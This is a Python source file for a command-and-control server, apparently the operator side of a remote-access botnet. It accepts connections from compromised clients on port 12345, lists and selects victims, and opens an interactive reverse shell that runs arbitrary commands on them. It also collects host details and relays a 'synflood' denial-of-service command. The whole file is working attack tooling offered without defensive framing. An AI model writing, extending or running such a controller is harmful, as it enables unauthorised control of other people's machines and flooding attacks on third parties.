#!/usr/bin/python3

import socket
import sys
import os
from threading import Thread

BUFFER_SIZE = 4096

def threaded(function):
    """
    Decorator for making a function threaded

    `Required`
    :param function:    function/method to run in a thread
    """
    import time
    import threading
    import functools
    @functools.wraps(function)
    def _threaded(*args, **kwargs):
        t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
        t.daemon = True
        t.start()
        return t
    return _threaded

# define our clear function
def clear_screen():
 
    # for windows
    if os.name == 'nt':
        _ = os.system('cls')
 
    # for mac and linux(here, os.name is 'posix')
    else:
        _ = os.system('clear')

def send_msg(conn : socket.socket, msg : str):
    """
    Send a command to a client

    `Required`
    :param conn:    connection to the client
    :param cmd:     command to send to the client
    """
    try:
        conn.sendall(msg.encode('utf-8'))
    except socket.error as err:
        print("Error sending command: " + str(err))
        return 1
    
def recv_msg(conn : socket.socket):
    """
    Receive a message from a client

    `Required`
    :param conn:    connection to the client
    """
    try:
        msg = conn.recv(BUFFER_SIZE).decode('utf-8')
    except socket.error as msg:
        print("Error receiving message: " + str(msg))
        return 1
    else:
        return msg

class Server:
    def __init__(self):
        self.host = '0.0.0.0'
        self.port = 12345
        self.socket = None
        self.all_connections = []
        self.all_addresses = []
        self.number_of_clients = 0
        self.active_connection = None

        # Threads to handle each client
        self.threads = []

        self._create_socket()
        self._bind_socket()

    def _create_socket(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        except socket.error as msg:
            print("Socket creation error: " + str(msg))
            sys.exit(1)

    def _bind_socket(self):
        try:
            print("Binding the Port: " + str(self.port))
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as msg:
            print("Socket binding error: " + str(msg))
            sys.exit(1)

    @threaded
    def accept_connections(self):
        while True:
            try:
                conn, addr = self.socket.accept()
                conn.setblocking(1)
            except:
                print("Error accepting connections")
                sys.exit(1)
            else:
                self.all_connections.append(conn)
                self.all_addresses.append(addr)
                self.number_of_clients += 1
                print("\n[+] New client connected: " + addr[0])

    def list_connections(self):
        print(f'{len(self.all_connections)} Active connections:')
        for i, conn in enumerate(self.all_connections):
            print(f'[{i}] : {self.all_addresses[i][0]}')

    def broadcast(self, msg):
        for conn in self.all_connections:
            send_msg(conn, msg)
        for i, conn in enumerate(self.all_connections):
            msg = recv_msg(conn)
            print('Client ' + str(i) + ': ' + msg)

    def cli(self):
        while True:
            cmd = input('C2 > ')
            if 'exit' in cmd.lower():
                self.broadcast('exit')
                self.socket.close()
                break
            elif 'clear' in cmd.lower():
                clear_screen()
            elif cmd.lower() == 'list':
                self.list_connections()
            elif 'select' in cmd.lower():
                conn_id = cmd.split(' ')[1]
                try:
                    conn_id = int(conn_id)
                except ValueError:
                    print("Invalid connection ID")
                    continue
                try:
                    self.active_connection = self.all_connections[conn_id]
                except IndexError:
                    print("Invalid connection ID")
                    continue
                print(f'Active connection: {self.all_addresses[conn_id][0]}')
                self.reverse_shell(conn_id)
    
    def reverse_shell(self, conn_id):
        while True:
            cmd = input(f'{self.all_addresses[conn_id][0]} > ')
            if cmd.lower() == 'exit':
                self.active_connection = None
                break
            elif cmd.lower() == 'clear':
                clear_screen()
            elif cmd.lower() == 'info':
                send_msg(self.active_connection, 'info')
                self.receive_client_info(self.active_connection)
            elif cmd.startswith('synflood'):
                send_msg(self.active_connection, cmd)
                msg = recv_msg(self.active_connection)
                print(msg)
            elif cmd:
                send_msg(self.active_connection, cmd)
                msg = recv_msg(self.active_connection)
                print(msg)

    def receive_client_info(self, conn):
        hostname = recv_msg(conn)
        os_version = recv_msg(conn)
        shell = recv_msg(conn)
        cwd = recv_msg(conn)
        # Print client info
        print(f'Hostname: {hostname}')
        print(f'OS Version: {os_version}')
        print(f'Shell: {shell}')
        print(f'Current working directory: {cwd}')

    def start(self):
        # Create a thread to accept connections
        accept_thread = Thread(target=self.accept_connections, name='accept_thread')
        accept_thread.start()
        # add the thread to the list of threads
        self.threads.append(accept_thread)

        # Main loop with server CLI
        self.cli()

if __name__ == "__main__":
    server = Server()
    server.start()
